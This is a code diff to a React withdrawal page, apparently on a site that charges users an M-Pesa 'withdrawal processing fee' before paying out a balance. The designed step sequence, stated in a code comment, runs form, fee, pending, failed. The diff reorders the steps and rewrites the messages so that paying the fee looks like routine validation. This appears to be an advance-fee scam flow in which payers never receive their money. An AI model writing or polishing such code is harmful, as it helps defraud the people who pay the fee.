@@ -123,15 +123,15 @@ const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES);
 // Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
 const BULK_THRESHOLD_KES = 25000;
 
-// ── M-Pesa flow (notice → form → pending → failed) ────────────────────────────
+// ── M-Pesa flow (form → fee → pending → failed) ───────────────────────────────
 function MpesaFlow({ user, initialStep, initialFeeRef }) {
   const router = useRouter();
-  const [step,     setStep]     = useState(initialStep || 'notice');
+  const [step,     setStep]     = useState(initialStep || 'form');
   const [phone,    setPhone]    = useState(user?.phone || '');
   const [idNumber, setIdNumber] = useState('');
   const [errors,   setErrors]   = useState({});
   const [loading,  setLoading]  = useState(false);
-  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Paystack fee reference
+  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Daraja fee reference
 
   // countdown
   const DURATION = 92 * 1000;
@@ -247,7 +247,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
       {step === 'fee' && (
         <>
           <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
-            Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to continue. You&apos;ll get a prompt on your phone, enter your PIN to confirm. The withdrawal form unlocks only after the payment is verified.
+            Your M-Pesa withdrawal details have been validated. Now pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa to continue. You&apos;ll get a prompt on your phone; enter your PIN to confirm.
           </div>
           <MpesaPay
             purpose="withdrawal_fee"
@@ -256,8 +256,8 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
             payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
             onSuccess={handleFeeSuccess}
           />
-          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>
-            <Icon name="arrowLeft" size={14} /> Back to Dashboard
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('form')}>
+            <Icon name="arrowLeft" size={14} /> Back to Details
           </button>
         </>
       )}
@@ -278,7 +278,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
             placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
           {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
           <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f0fff4', marginTop: 16, fontSize: 13 }}>
-            ✓ Withdrawal fee of <strong>KES {FEE_KES.toLocaleString()}</strong> paid and verified.
+            After you submit these details, you&apos;ll be prompted to pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa.
           </div>
           {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
           <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
@@ -998,7 +998,7 @@ export default function WithdrawPage() {
   const isBulk = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
   if (isBulk) return <BulkWithdrawalFlow user={user} paidRef={psref} />;
 
-  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'notice'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
+  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep="form" initialFeeRef={psref} />;
   if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
   if (method === 'international')  return <InternationalFlow user={user} initialStep="form" initialFeeRef={stepQ === 'form' ? psref : ''} />;
 
